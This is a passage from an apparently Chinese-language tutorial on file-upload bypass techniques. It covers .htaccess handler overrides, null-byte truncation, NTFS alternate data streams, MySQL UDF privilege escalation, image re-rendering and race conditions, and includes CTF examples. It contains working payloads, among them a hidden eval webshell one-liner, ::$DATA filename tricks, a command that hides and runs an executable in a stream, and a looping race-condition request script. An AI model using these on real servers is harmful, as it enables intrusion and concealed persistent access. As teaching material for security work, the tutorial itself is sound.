data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>Files ^<span class=\"token punctuation\">(</span>*.jpeg<span class=\"token operator\">|</span>*.jpg<span class=\"token operator\">|</span>*.png<span class=\"token operator\">|</span>*.gif<span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>order deny,allow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>deny from all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>/Files<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"绕过方法-5\"><a class=\"anchor\" href=\"#绕过方法-5\">#</a> 绕过方法</h3>\n<p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>\n<p>补充知识 htaccess：</p>\n<blockquote>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n</blockquote>\n<hr />\n<p>这里还有一种</p>\n<p>如果 PHP 安全没配置好就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。<br />\n来做个小实验，先描述下效果：</p>\n<blockquote>\n<p>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含 &quot;haha&quot; 这个字符串的任意文件，所以无论文件名是什么样子，只要包含 &quot;haha&quot; 这个字符串，都可以被以 php 的方式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制建一个.htaccess 文件，里面的内容如下</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"haha\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"文件系统00截断\"><a class=\"anchor\" href=\"#文件系统00截断\">#</a> 文件系统 00 截断</h2>\n<p>00 截断的条件 (过气了)</p>\n<pre><code class=\"language-txt\">1.  php版本小于5.3.4\n2.  php的magic\\_quotes\\_gpc为OFF状态\n</code></pre>\n<h3 id=\"原理-4\"><a class=\"anchor\" href=\"#原理-4\">#</a> 原理</h3>\n<p>** 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。** 利用 00 截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生 0x00、%00 上传截断漏洞。</p>\n<h3 id=\"绕过方法-6\"><a class=\"anchor\" href=\"#绕过方法-6\">#</a> 绕过方法</h3>\n<p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>\n<h2 id=\"7windows-ntfs文件系统特性绕过\"><a class=\"anchor\" href=\"#7windows-ntfs文件系统特性绕过\">#</a> 7.windows NTFS 文件系统特性绕过</h2>\n<p>NTFS 交换数据流（alternate data streams 简称 ADS）是 NTFS 磁盘格式的新特性，见漏洞详细可查 CVE-1999-0278。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>一个完整的流的格式为：::<br />\n 文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br />\n修改宿主文件的内容或流的内容，不会对彼此造成影响。<br />\n流类型总是以符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (DATA)，默认流名为空。<br />\nADS 可以省略流名，但不能省略流类型。<br />\nNTFS 文件系统中的文件夹没有 data 流，但可以指派 data 流，文件夹的主流为 directory 流 (I N D E X A L L O C A T I O N) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEX A LLOCATION)，流名默认为 I30<br />\n 当我们对一个在 NTFS 分区中的 ASP 文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “.” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA，结果 IIS 不认为这是一个 ASP 文件，而文件系统可以识别该请求，于是返回 ASP 的源代码。</p>\n<h3 id=\"绕过方法-7\"><a class=\"anchor\" href=\"#绕过方法-7\">#</a> 绕过方法</h3>\n<ol>\n<li>IIS 目录访问权限绕过：在 IIS6.0+PHP、IIS7+asp、IIS7.5+php 的环境下，如果目录是通过 HTTP Basic 来认证，假设网站根目录存在 index.php 文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/admin::<span class=\"token variable\">$INDEX_ALLOCATION</span>/index.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/admin:<span class=\"token variable\">$i30</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$INDEX_ALLOCATION</span>/index.asp</pre></td></tr></table></figure><ol start=\"2\">\n<li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个 test.php 的文件，其中内容和所上传文件内容相同，并被解析。</li>\n</ol>\n<table>\n    <tr>\n        <th>上传的文件名</th>\n        <th>服务器表面现象</th>\n        <th>生成的文件内容</th>\n    </tr>\n    <tr>\n        <td>Test.php:a.jpg</td>\n        <td>生成Test.php</td>\n        <td>空</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA</td>\n        <td>生成test.php</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$INDEX_ALLOCATION</td>\n        <td>生成test.php文件夹</td>\n        <td></td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\0.jpg</td>\n        <td>生成0.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n    <tr>\n        <td>Test.php::$DATA\\aaa.jpg</td>\n        <td>生成aaa.jpg</td>\n        <td>&lt;?php phpinfo();?&gt;</td>\n    </tr>\n</table>\n<pre><code class=\"language-txt\">注意：\n对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，\n从而认为其宿主文件名为1.asp而将.jpg识别为流名。\n通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。\n然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。\n原因是在PHP+IIS的环境下，&quot; 同义. &gt;同义? &lt;同义*\n</code></pre>\n<ol start=\"3\">\n<li>隐藏 webshell：</li>\n</ol>\n<p>在服务器上 echo 一个数据流文件进去，比如 index.php 是网页正常文件，命令如下：<br />\n <code>echo ^&lt;?php @eval(request[cmd])?^ &gt;&gt; index.php:hidden.jpg</code> <br />\n 这样生成了一个不可见的 shell hidden.jpg，type dir del 命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</p>\n<ol start=\"4\">\n<li>mysql 中的 udf 提权:</li>\n</ol>\n<pre><code class=\"language-txt\">如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。\n而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。\n</code></pre>\n<p>如果数据库用户对数据库 mysql（注意指的是数据库里的默认库 mysql）具有 insert 和 delete 权限，就可以创建加载自定义函数。<br />\n而又因为 mysql 服务是以 system 权限运行在 windows 主机上，所以这个时候我们就可以通过自定义函数以 system 权限执行命令了。</p>\n<p>Mysql 5.0.67 之前，DLL 的导入目录是 C:\\windows\\system32<br />\n 从 MySQL 5.1 开始，要求目录必须是 mysql 目录下的 lib\\plugin\\ 目录，而且 mysql 5.1 之后的常用安装版本是默认不存在 lib\\plugin 目录的。</p>\n<p>执行 sql 语句<br />\n <code>show variables like '%plugin%';</code></p>\n<p>查看目录位置。<br />\n利用 ADS 依次创建 lib、plugin 目录</p>\n<p><code>select 'xxx' into outfile 'E:\\\\phpstudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';</code></p>\n<p>如果创建失败的话，执行</p>\n<p><code>show variables like '%secure%';</code> <br />\n 看看 secure_file_priv 的值：</p>\n<pre><code class=\"language-txt\">null表示限制mysqld不允许导入导出\n当secure_file_priv的值为/tmp/，表示限制mysqld 的导入导出只能在/tmp/目录下\n当secure_file_priv的值为空，表示不对mysqld的导入导出做限制\n</code></pre>\n<ol start=\"5\">\n<li>隐藏 exe 文件</li>\n</ol>\n<p><code>type muma.txt test.txt:muma.exe</code></p>\n<p>在 xp 中可以用 start test.txt:muma.exe 执行，但是 win7 以上这样执行会报错。win7 及之后的系统的正确姿势如下：<br />\n创建一个符号链接文件 test.exe，链接到寄生的交换数据流可执行文件 test.txt:muma.exe 上：mklink test.exe,test.txt:muma.exe，然后执行 start test.exe/b 即可<br />\n更新一个方法：<br />\n <code>wmic process call create &quot;C:\\ProjectCode\\test\\test:putty.exe&quot;</code></p>\n<pre><code class=\"language-txt\">在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查\n杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要\n创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来\n后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。\n</code></pre>\n<p>查看隐藏流文件</p>\n<pre><code class=\"language-txt\">使用这两款小工具配合进行检测和清除寄生的交换数据流\nhttps://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926\nlabs.exe检测，streams.exe进行清理。\n还有一个叫做AlternateStreamView的工具也可以\n</code></pre>\n<h2 id=\"二次渲染绕过\"><a class=\"anchor\" href=\"#二次渲染绕过\">#</a> 二次渲染绕过</h2>\n<p>感觉这个的知识点偏向文件格式分析 (MISC)。在制作图片马的时候</p>\n<p>往往是在图片后头附件一段 php 代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p>\n<p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用 winhex 或者是 010editor 等在文件内进行修改即可。</p>\n<h2 id=\"条件竞争\"><a class=\"anchor\" href=\"#条件竞争\">#</a> 条件竞争</h2>\n<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>\n<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding:utf-8-*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>COUNT <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">global</span> COUNT</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    read_value <span class=\"token operator\">=</span> COUNT</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"COUNT in Thread-%s is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>threads_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> read_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    COUNT <span class=\"token operator\">=</span> read_value <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    threads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>Run<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>threads<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        threads<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finally, The COUNT is %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>COUNT<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#######################===== 输出结果</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#部分结果为：</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        ……</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9989</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9972</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9990</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9973</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9991</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9974</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9992</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9975</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9993</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9976</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9994</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9977</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9995</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9978</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9996</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9979</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9997</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9980</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9998</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9981</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>COUNT <span class=\"token keyword\">in</span> Thread<span class=\"token operator\">-</span><span class=\"token number\">9999</span> <span class=\"token keyword\">is</span> <span class=\"token number\">9982</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Finally<span class=\"token punctuation\">,</span> The COUNT <span class=\"token keyword\">is</span> <span class=\"token number\">9983</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Process finished <span class=\"token keyword\">with</span> exit code <span class=\"token number\">0</span></pre></td></tr></table></figure><p>按照我们的预想，结果应该都是 10000，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p>\n<p>这是什么原因呢？</p>\n<p>原因就在于我们没有对变量 COUNT 做同步制约，导致可能 Thread-7 在读 COUNT, 还没来得及更改 COUNT,Thread-8 抢夺资源，也来读 COUNT, 并且将 COUNT 修改为它读的结果 + 1，由此出现非预期。</p>\n<p>同样的，WEB 应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p>\n<h3 id=\"例一金额提现\"><a class=\"anchor\" href=\"#例一金额提现\">#</a> 例一：金额提现</h3>\n<p>假设现有一个用户在系统中共有 2000 元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现 2000 元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现 2000 元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为 - 2000。而这产生的后果将会是平台多向该用户付出 2000 元</p>\n<h3 id=\"例二moctf里的一道题\"><a class=\"anchor\" href=\"#例二moctf里的一道题\">#</a> 例二：moctf 里的一道题</h3>\n<p>打开网址后一直打开的是 index2.php 修改为 index.php 后发现还是会跳转到 index2 抓包修改 index.php。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>发现 index.php 是一个 302 网页，因此就可以看到这里存在的一个文件 uploadsomething.php。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>随便填写文件名下面写入代码，再进行提交。</p>\n<p>访问后</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p>\n<p>写入一个 py 文件一直发 requests 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h3 id=\"例三xman-easy-gallery\"><a class=\"anchor\" href=\"#例三xman-easy-gallery\">#</a> 例三：XMAN-Easy Gallery</h3>\n<p>伪协议读取代码<br />\n <code>http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</code></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$tmpName</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$size</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$type</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pic'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$name1</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".gif\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$name1</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hehe\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$type</span><span class=\"token operator\">!==</span><span class=\"token string double-quoted-string\">\"image/gif\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token function\">mime_content_type</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script language=javascript>alert('不允许的文件类型！');history.go(-1)&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token 